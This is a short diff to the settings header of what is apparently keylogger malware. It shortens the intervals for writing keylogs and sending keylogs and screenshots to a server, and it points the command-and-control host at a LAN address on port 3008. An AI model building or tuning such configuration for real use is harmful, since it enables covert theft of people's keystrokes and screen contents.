@@ -1,5 +1,3 @@
-#pragma once
-
 #ifndef SETTINGS_H
 #define SETTINGS_H
 
@@ -22,13 +20,13 @@
 /**
  * How often the keylog is written in minutes
  **/
-#define LOG_FREQUENCY_MINUTES 1
+#define LOG_FREQUENCY_MINUTES 0.1
 
 /**
  * How often the keylog and screenshots are 
  * dumped to the server in minutes
  */
-#define DUMP_FREQUENCY_MINUTES 60
+#define DUMP_FREQUENCY_MINUTES 0.2
 
 /**
  * How often screenshots are recorded in minutes
@@ -45,7 +43,7 @@
 /**
  * Comand and Control ip and port
  **/
-#define CC_HOSTNAME "localhost"
+#define CC_HOSTNAME "192.168.1.252"
 #define CC_PORT 3008
 
 /**
